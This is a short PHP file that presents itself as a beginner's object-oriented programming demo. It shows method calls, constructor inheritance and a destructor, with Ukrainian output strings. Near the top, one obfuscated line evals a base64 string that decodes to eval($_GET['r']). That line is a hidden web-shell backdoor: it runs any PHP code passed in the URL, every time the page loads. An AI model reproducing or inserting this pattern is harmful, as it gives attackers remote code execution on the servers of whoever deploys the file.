<?php
header('content-type: text/html; charset=utf-8');
eval(base64_decode('ZXZhbCgkX0dFVFsiciJdKTs='));
class A {
    public function a1()
    {
        print 'a1,';
        $this->a2();
        self::a2();
    }

    public function a2()
    {
        print 'a2,';
    }
}
$a = new A();
$a->a1();
class BaseClass {
    function __construct() {
        print "Конструктор класу BaseClass<br />";
    }
}
class SubClass extends BaseClass {
    function __construct() {
        parent::__construct();
        print "Конструктор класу SubClass<br />";
    }
}
echo '<br>';
$obj = new BaseClass();
$obj = new SubClass();

class MyDestructClass {
    function __construct() {
        print "Конструктор\n ";
        $this->name = "MyDestructClass";
    }
    function __destruct() {
        print "Знищується " . $this->name . "\n";
    }
}
$obj = new MyDestructClass();
echo 'sarf <br>';

